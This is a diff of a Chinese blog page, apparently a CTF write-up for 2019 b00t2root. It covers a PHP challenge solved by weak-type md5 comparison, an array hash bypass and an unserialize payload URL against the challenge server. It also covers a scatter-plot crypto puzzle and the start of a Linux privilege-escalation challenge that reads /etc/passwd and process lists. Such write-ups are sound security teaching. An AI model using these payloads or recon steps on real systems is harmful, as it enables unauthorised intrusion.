@@ -1,393 +1,832 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
+
+
+
+
+
 <head><meta name="generator" content="Hexo 3.8.0">
-  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/apple-touch-icon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
   
-  <title>2019-b00t2root-CTF | AssassinQ</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  
-  <meta name="keywords" content="ctfwp">
-  
-  
-  
-  
-  <meta name="description" content="这个比赛有一类 linux 的题，感觉很有意思。">
-<meta name="keywords" content="ctf,wp">
-<meta property="og:type" content="article">
-<meta property="og:title" content="2019-b00t2root-CTF">
-<meta property="og:url" content="blog.b3ale.cn/2019/03/31/2019-b00t2root-CTF/index.html">
-<meta property="og:site_name" content="AssassinQ">
-<meta property="og:description" content="这个比赛有一类 linux 的题，感觉很有意思。">
-<meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2019-08-26T01:17:06.274Z">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="2019-b00t2root-CTF">
-<meta name="twitter:description" content="这个比赛有一类 linux 的题，感觉很有意思。">
-  
-    <link rel="alternate" href="/atom.xml" title="AssassinQ" type="application/atom+xml">
-  
-  <link rel="icon" href="/css/images/favicon.ico">
-  
-    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
-  
-  <link href="https://fonts.googleapis.com/css?family=Open+Sans|Montserrat:700" rel="stylesheet" type="text/css">
-  <link href="https://fonts.googleapis.com/css?family=Roboto:400,300,300italic,400italic" rel="stylesheet" type="text/css">
-  <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
-  <style type="text/css">
-    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/9749f0/00000000000000000001008f/27/l?subset_id=2&fvd=n5) format("woff2");font-weight:500;font-style:normal;}
-    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/90cf9f/000000000000000000010091/27/l?subset_id=2&fvd=n7) format("woff2");font-weight:500;font-style:normal;}
-    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/8a5494/000000000000000000013365/27/l?subset_id=2&fvd=n4) format("woff2");font-weight:lighter;font-style:normal;}
-    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/d337d8/000000000000000000010095/27/l?subset_id=2&fvd=i4) format("woff2");font-weight:400;font-style:italic;}</style>
-    
-  <link rel="stylesheet" id="athemes-headings-fonts-css" href="//fonts.googleapis.com/css?family=Yanone+Kaffeesatz%3A200%2C300%2C400%2C700&amp;ver=4.6.1" type="text/css" media="all">
+  <meta name="theme-color" content="#005f6b">
+  <meta name="description" content="ZJGSU-IS-17">
+  <meta name="author" content>
+  <meta name="keywords" content>
+  <title>2019-b00t2root-CTF - AssassinQ</title>
 
-  <link rel="stylesheet" id="athemes-headings-fonts-css" href="//fonts.googleapis.com/css?family=Oswald%3A300%2C400%2C700&amp;ver=4.6.1" type="text/css" media="all">
-  <link rel="stylesheet" href="/css/style.css">
+  <link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/5.12.1/css/all.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/mdbootstrap/4.13.0/css/mdb.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/3.0.1/github-markdown.min.css">
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">
 
-  <script src="/js/jquery-3.1.1.min.js"></script>
 
-  <!-- Bootstrap core CSS -->
-  <link rel="stylesheet" href="/css/bootstrap.css">
-  <link rel="stylesheet" href="/css/fashion.css">
-  <link rel="stylesheet" href="/css/glyphs.css"><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+  <link rel="stylesheet" href="/lib/prettify/tomorrow-night-eighties.min.css">
 
+<link rel="stylesheet" href="/css/main.css">
+
+
+  <link defer rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css">
+
+
+<!-- 自定义样式保持在最底部 -->
+
+
+<link rel="alternate" href="/atom.xml" title="AssassinQ" type="application/atom+xml"><!-- hexo-inject:begin --><!-- hexo-inject:end -->
 </head>
-</html>
 
 
-  <body data-spy="scroll" data-target="#toc" data-offset="50">
+<body>
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">&nbsp;<strong>AssassinQ</strong>&nbsp;</a>
 
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
 
-  
-  
-  <!-- hexo-inject:begin --><!-- hexo-inject:end --><div class="site-header-image">
-    <img id="originBg" width="100%" alt="Hike News" src>
-  </div>
-
-  <div id="header-blur" class="site-header-image blur" style="position: absolute; top:0; height: 207px; min-height: 207px; min-width: 100%;">
-    <img id="blurBg" width="100%" style="top: 96%" alt="Hike News" src>
-  </div>
-
-  <script>
-        var imgUrls = "css/images/pose01.jpg".split(",");
-        var random = Math.floor((Math.random() * imgUrls.length ));
-        if (imgUrls[random].startsWith('http') || imgUrls[random].indexOf('://') >= 0) {
-          document.getElementById("originBg").src=imgUrls[random];
-          document.getElementById("blurBg").src=imgUrls[random];
-        } else {
-          document.getElementById("originBg").src='/' + imgUrls[random];
-          document.getElementById("blurBg").src='/' + imgUrls[random];
-        }
-    </script>
-
-
-
-
-<header id="allheader" class="site-header" role="banner" style="width: 100%; position: absolute; top:0; background: rgba(255,255,255,.8);">
-  <div class="clearfix container">
-      <div class="site-branding">
-
-          <h1 class="site-title">
-            
-              <a href="/" title="AssassinQ" rel="home"> AssassinQ </a>
-            
-          </h1>
-          
-          
-            <div class="site-description">ZJGSU-IS-17</div>
-          
-            
-          <nav id="main-navigation" class="main-navigation" role="navigation">
-            <a class="nav-open">Menu</a>
-            <a class="nav-close">Close</a>
-
-            <div class="clearfix sf-menu">
-              <ul id="main-nav" class="menu sf-js-enabled sf-arrows" style="touch-action: pan-y;">
-                    
-                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class href="/">Home</a> </li>
-                    
-                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class href="/archives">Archives</a> </li>
-                    
-                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class href="/tags">Tags</a> </li>
-                    
-                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class href="/about">About</a> </li>
-                    
-              </ul>
-            </div>
-          </nav>
-
-      </div>
-  </div>
-</header>
-
-
-  <div id="container">
-    <div id="wrap">
-            
-      <div id="content" class="outer">
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
         
-          <section id="main" style="float:none;"><article id="post-2019-b00t2root-CTF" style="width: 66%; float:left;" class="article article-type-post" itemscope itemprop="blogPost">
-  <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
-    
-    
-      <header class="article-header">
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/">Home</a>
+          </li>
         
-  
-    <h1 class="thumb" itemprop="name">
-      2019-b00t2root-CTF
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-meta">
-      	<a href="/2019/03/31/2019-b00t2root-CTF/" class="article-date">
-	  <time datetime="2019-03-31T09:47:36.000Z" itemprop="datePublished">March 31, 2019</time>
-	</a>
-
-       
-      
-
-	  |
-	  4k words
-	  |
-	  22 minute(s) to read
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/archives/">Archives</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/tags/">Tags</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/about/">About</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/links/">Links</a>
+          </li>
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
+          </li>
+        
+      </ul>
     </div>
-    <div class="article-entry" itemprop="articleBody">
+  </div>
+</nav>
+
+    <div class="view intro-2" id="background" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask rgba-black-light flex-center">
+          <div class="container text-center white-text fadeInUp">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              
+                <p class="mt-3 post-meta">
+                  <i class="fas fa-calendar-alt" aria-hidden="true"></i>
+                  Sunday, March 31st 2019, 5:47 pm
+                </p>
+              
+
+              <p class="mt-1">
+                
+                  
+                  <span class="post-meta">
+                    <i class="far fa-chart-bar"></i>
+                    4.7k 字
+                  </span>
+                
+
+                
+                  
+                  <span class="post-meta">
+                      <i class="far fa-clock"></i>
+                      27 分钟
+                  </span>
+                
+
+                
+              </p>
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
       
-        <p>这个比赛有一类 linux 的题，感觉很有意思。</p>
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5 z-depth-3" id="board">
+          <div class="post-content mx-auto" id="post">
+            
+            <div class="markdown-body">
+              <p>这个比赛有一类 linux 的题，感觉很有意思。</p>
 <a id="more"></a>
 <h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="EasyPhp"><a href="#EasyPhp" class="headerlink" title="EasyPhp"></a>EasyPhp</h2><p>题目如下：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$str1 = $_GET[<span class="string">'1'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'1'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>($str1 == md5($str1))&#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag1;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$str2 = $_GET[<span class="string">'2'</span>];</span><br><span class="line">$str3 = $_GET[<span class="string">'3'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'2'</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">'3'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>($str2 !== $str3)&#123;</span><br><span class="line">        <span class="keyword">if</span>(hash(<span class="string">'md5'</span>, $salt . $str2) == hash(<span class="string">'md5'</span>, $salt . $str3))&#123;</span><br><span class="line">            <span class="keyword">echo</span> $flag2;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Secrets</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $temp;</span><br><span class="line">    <span class="keyword">var</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'4'</span>])) &#123;</span><br><span class="line">    $str4 = $_GET[<span class="string">'4'</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(get_magic_quotes_gpc())&#123;</span><br><span class="line">        $str4=stripslashes($str4);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $res = unserialize($str4);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($res) &#123;</span><br><span class="line">    $res-&gt;flag=$flag3;</span><br><span class="line">        <span class="keyword">if</span> ($res-&gt;flag === $res-&gt;temp)</span><br><span class="line">            <span class="keyword">echo</span> $res-&gt;flag;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>第一个 check 是弱类型比较，第二个 check 是数组 hash 后返回 null，最后一个则是<a href="https://www.notsosecure.com/remote-code-execution-via-php-unserialize/" target="_blank" rel="noopener">php 反序列化</a>。payload 如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://3.16.68.122/Easy-php/?1=0e215962017&amp;2[]=a&amp;3[]=b&amp;4=O:7:%22Secrets%22:2:&#123;s:4:%22temp%22;N;s:4:%22flag%22;R:2;&#125;</span><br></pre></td></tr></table></figure>
-<h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="Scatter-Me"><a href="#Scatter-Me" class="headerlink" title="Scatter Me"></a>Scatter Me</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1:3:1;1.25:3:1;1.5:3:1;1.75:3:1;2:3:1;2:2.75:1;2:2.5:1;2:2.25:1;2:2:1;2:1.75:1;2:1.5:1;1:2.25:1;1.25:2.25:1;1.5:2.25:1;1.75:2.25:1;1:1.5:1;1.25:1.5:1;1.5:1.5:1;1.75:1.5:1;3:3:1;3.25:3:1;3.5:3:1;3.75:3:1;4:3:1;4:2.75:1;4:2.5:1;4:2.25:1;4:2:1;4:1.75:1;4:1.5:1;3:1.5:1;3.25:1.5:1;3.5:1.5:1;3.75:1.5:1;3:1.75:1;3:2:1;3:2.25:1;3:2.5:1;3:2.75:1;5:3:1;5.25:3:1;5.5:3:1;5.75:3:1;6:3:1;6:2.75:1;6:2.5:1;6:2.25:1;6:2:1;6:1.75:1;6:1.5:1;5.75:1.5:1;5.5:1.5:1;5.25:1.5:1;5:1.5:1;5:1.75:1;5:2:1;5:2.25:1;5:2.5:1;5:2.75:1;7:3:1;7.25:3:1;7.5:3:1;7.75:3:1;8:3:1;8:2.75:1;8:2.5:1;8:2.25:1;8:2:1;8:1.75:1;8:1.5:1;9:3:1;9.25:3:1;9.5:3:1;9.75:3:1;10:3:1;10:2.75:1;10:2.5:1;10:2.25:1;9.75:2.25:1;9.5:2.25:1;9.25:2.25:1;9:2.25:1;9:2:1;9:1.75:1;9:1.5:1;9.25:1.5:1;9.5:1.5:1;9.75:1.5:1;10:1.5:1;11:3:1;11.25:3:1;11.5:3:1;11.75:3:1;12:3:1;12:2.75:1;12:2.5:1;12:2.25:1;12:2:1;12:1.75:1;12:1.5:1;11.75:1.5:1;11.5:1.5:1;11.25:1.5:1;11:1.5:1;11:1.75:1;11:2:1;11:2.25:1;11:2.5:1;11:2.75:1;11.25:2.25:1;11.5:2.25:1;11.75:2.25:1</span><br></pre></td></tr></table></figure>
-<p>仔细观察可以发现其实是一组三维坐标，而且 z 轴都为一，可以当作是二维的。用 python 还原出来：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line">f = open(<span class="string">'scatter.txt'</span>, <span class="string">'rb'</span>)</span><br><span class="line">cords = f.read().split(<span class="string">';'</span>)</span><br><span class="line">f.close()</span><br><span class="line">x, y, z = [], [], []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> cords:</span><br><span class="line">    x.append(float(i.split(<span class="string">':'</span>)[<span class="number">0</span>]))</span><br><span class="line">    y.append(float(i.split(<span class="string">':'</span>)[<span class="number">1</span>]))</span><br><span class="line">    <span class="comment"># z.append(float(i.split(':')[2]))</span></span><br><span class="line">plt.scatter(x, y) <span class="comment"># , z)</span></span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>
+<pre><code class="php">&lt;?php
+include &quot;flag.php&quot;;
+highlight_file(__FILE__);
+error_reporting(0);
+$str1 = $_GET[&#39;1&#39;];
+
+if(isset($_GET[&#39;1&#39;])){
+    if($str1 == md5($str1)){
+        echo $flag1;
+    }
+    else{
+        die();
+    }
+}
+else{
+    die();
+}
+
+$str2 = $_GET[&#39;2&#39;];
+$str3 = $_GET[&#39;3&#39;];
+
+if(isset($_GET[&#39;2&#39;]) &amp;&amp; isset($_GET[&#39;3&#39;])){
+    if($str2 !== $str3){
+        if(hash(&#39;md5&#39;, $salt . $str2) == hash(&#39;md5&#39;, $salt . $str3)){
+            echo $flag2;
+        }
+        else{
+            die();
+        }
+    }
+    else{
+        die();
+    }
+}
+else{
+    die();
+}
+?&gt;
+&lt;?php
+
+class Secrets {
+    var $temp;
+    var $flag;
+}
+
+if (isset($_GET[&#39;4&#39;])) {
+    $str4 = $_GET[&#39;4&#39;];
+
+    if(get_magic_quotes_gpc()){
+        $str4=stripslashes($str4);
+    }
+
+    $res = unserialize($str4);
+
+    if ($res) {
+    $res-&gt;flag=$flag3;
+        if ($res-&gt;flag === $res-&gt;temp)
+            echo $res-&gt;flag;
+        else
+            die();
+    }
+    else die();
+}
+
+?&gt;
+</code></pre>
+<p>第一个 check 是弱类型比较，第二个 check 是数组 hash 后返回 null，最后一个则是 <a href="https://www.notsosecure.com/remote-code-execution-via-php-unserialize/" target="_blank" rel="noopener">php 反序列化</a>。payload 如下：</p>
+<pre><code>http://3.16.68.122/Easy-php/?1=0e215962017&amp;2[]=a&amp;3[]=b&amp;4=O:7:%22Secrets%22:2:{s:4:%22temp%22;N;s:4:%22flag%22;R:2;}
+</code></pre><h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="Scatter-Me"><a href="#Scatter-Me" class="headerlink" title="Scatter Me"></a>Scatter Me</h2><pre><code>1:3:1;1.25:3:1;1.5:3:1;1.75:3:1;2:3:1;2:2.75:1;2:2.5:1;2:2.25:1;2:2:1;2:1.75:1;2:1.5:1;1:2.25:1;1.25:2.25:1;1.5:2.25:1;1.75:2.25:1;1:1.5:1;1.25:1.5:1;1.5:1.5:1;1.75:1.5:1;3:3:1;3.25:3:1;3.5:3:1;3.75:3:1;4:3:1;4:2.75:1;4:2.5:1;4:2.25:1;4:2:1;4:1.75:1;4:1.5:1;3:1.5:1;3.25:1.5:1;3.5:1.5:1;3.75:1.5:1;3:1.75:1;3:2:1;3:2.25:1;3:2.5:1;3:2.75:1;5:3:1;5.25:3:1;5.5:3:1;5.75:3:1;6:3:1;6:2.75:1;6:2.5:1;6:2.25:1;6:2:1;6:1.75:1;6:1.5:1;5.75:1.5:1;5.5:1.5:1;5.25:1.5:1;5:1.5:1;5:1.75:1;5:2:1;5:2.25:1;5:2.5:1;5:2.75:1;7:3:1;7.25:3:1;7.5:3:1;7.75:3:1;8:3:1;8:2.75:1;8:2.5:1;8:2.25:1;8:2:1;8:1.75:1;8:1.5:1;9:3:1;9.25:3:1;9.5:3:1;9.75:3:1;10:3:1;10:2.75:1;10:2.5:1;10:2.25:1;9.75:2.25:1;9.5:2.25:1;9.25:2.25:1;9:2.25:1;9:2:1;9:1.75:1;9:1.5:1;9.25:1.5:1;9.5:1.5:1;9.75:1.5:1;10:1.5:1;11:3:1;11.25:3:1;11.5:3:1;11.75:3:1;12:3:1;12:2.75:1;12:2.5:1;12:2.25:1;12:2:1;12:1.75:1;12:1.5:1;11.75:1.5:1;11.5:1.5:1;11.25:1.5:1;11:1.5:1;11:1.75:1;11:2:1;11:2.25:1;11:2.5:1;11:2.75:1;11.25:2.25:1;11.5:2.25:1;11.75:2.25:1
+</code></pre><p>仔细观察可以发现其实是一组三维坐标，而且 z 轴都为一，可以当作是二维的。用 python 还原出来：</p>
+<pre><code class="python">#!/usr/bin/env python
+import numpy as np
+import matplotlib.pyplot as plt
+
+f = open(&#39;scatter.txt&#39;, &#39;rb&#39;)
+cords = f.read().split(&#39;;&#39;)
+f.close()
+x, y, z = [], [], []
+for i in cords:
+    x.append(float(i.split(&#39;:&#39;)[0]))
+    y.append(float(i.split(&#39;:&#39;)[1]))
+    # z.append(float(i.split(&#39;:&#39;)[2]))
+plt.scatter(x, y) # , z)
+plt.show()
+</code></pre>
 <h1 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h1><h2 id="Steve-Rogers"><a href="#Steve-Rogers" class="headerlink" title="Steve Rogers"></a>Steve Rogers</h2><p>Steve knows there’s a flag somewhere in plain sight. Login as <code>steve</code> and find it for him.</p>
-<p>给了一个 socat 的脚本，连上去以后是一个 docker。看了一下<code>steve</code>家目录下没有什么东西，隐藏文件也是一些没用的像是<code>.bashrc</code>还有<code>.profile</code>之类的文件。可以先试试<code>cat /etc/passwd</code>能不能用，看看服务器上有哪些用户：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">steve@d18fb074a417:~$ ls</span><br><span class="line">steve@d18fb074a417:~$ cat /etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">_apt:x:100:65534::/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-network:x:101:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin</span><br><span class="line">systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin</span><br><span class="line">messagebus:x:103:104::/nonexistent:/usr/sbin/nologin</span><br><span class="line">sshd:x:104:65534::/run/sshd:/usr/sbin/nologin</span><br><span class="line">steve:x:1000:1000:,,,:/home/steve:/bin/bash</span><br><span class="line">tony:x:1001:0:,,,:/home/tony:/bin/bash</span><br></pre></td></tr></table></figure>
-<p>可以看到除了一开始的<code>root</code>，最下面还有<code>steve</code>和<code>tony</code>两个用户，上面还有一个<code>sshd</code>，说明服务器上起了 ssh。这里推荐一个关于<a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/" target="_blank" rel="noopener">Linux 提权基础（Basic Linux Privilege Escalation）</a>的网站，上面提供了很多可以提权的小命令。我们先用<code>ps aux</code>做一个尝试，查看有什么服务正在跑着，以及哪些用户对应着哪些服务：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">steve@d18fb074a417:~$ ps aux</span><br><span class="line">USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND</span><br><span class="line">root         1  0.0  0.0  18376  3108 pts/0    Ss   09:52   0:00 bash /tmp/42.sh</span><br><span class="line">root        14  0.0  0.0  72296  3408 ?        Ss   09:52   0:00 /usr/sbin/sshd</span><br><span class="line">root        16  0.0  0.0  55952  3344 pts/0    S    09:52   0:00 su -l steve</span><br><span class="line">steve       18  0.0  0.0  18508  3444 pts/0    S    09:52   0:00 -su</span><br><span class="line">steve       25  0.0  0.0  34400  3028 pts/0    R+   09:55   0:00 ps aux</span><br><span class="line">steve@d18fb074a417:~$ cat /tmp/42.sh</span><br><span class="line">cat: /tmp/42.sh: No such file or directory</span><br></pre></td></tr></table></figure>
-<p>可以看到一个<code>bash /tmp/42.sh</code>很引人注目，但是试图打开它的时候失败了。再试试<code>ps -ef</code>，<code>man</code>一下看看这两个参数：</p>
